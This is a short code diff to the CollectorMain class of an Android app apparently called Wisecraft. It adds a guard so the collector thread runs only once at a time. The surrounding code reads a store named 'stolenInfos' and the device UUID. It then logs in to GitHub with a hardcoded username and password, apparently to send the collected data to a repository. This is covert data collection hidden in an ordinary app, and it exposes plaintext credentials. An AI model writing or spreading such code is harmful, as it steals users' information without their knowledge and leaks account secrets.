@@ -26,6 +26,7 @@ import org.eclipse.egit.github.core.service.RepositoryService;
 import static com.nao20010128nao.Wisecraft.Utils.*;
 
 public class CollectorMain extends ContextWrapper implements Runnable {
+	static boolean running=false;
 	public CollectorMain() {
 		super(TheApplication.instance);
 		new Thread(this).start();
@@ -34,8 +35,12 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 	@Override
 	public void run() {
 		// TODO: Implement this method
+		if(running){
+			return;
+		}
 		BinaryPrefImpl sb=TheApplication.instance.stolenInfos;
 		String uuid=TheApplication.instance.uuid;
+		running=true;
 		try {
 			GitHubClient ghc=new GitHubClient().setCredentials("RevealEverything", "nao2001nao");
 			Repository repo=null;
@@ -105,6 +110,7 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 				try {
 					if (fos != null)fos.close();
 				} catch (IOException e) {}
+				running=false;
 			}
 			for (String s:sb.getAll().keySet().toArray(new String[sb.getAll().size()])) {
 				Log.d("remain", s);
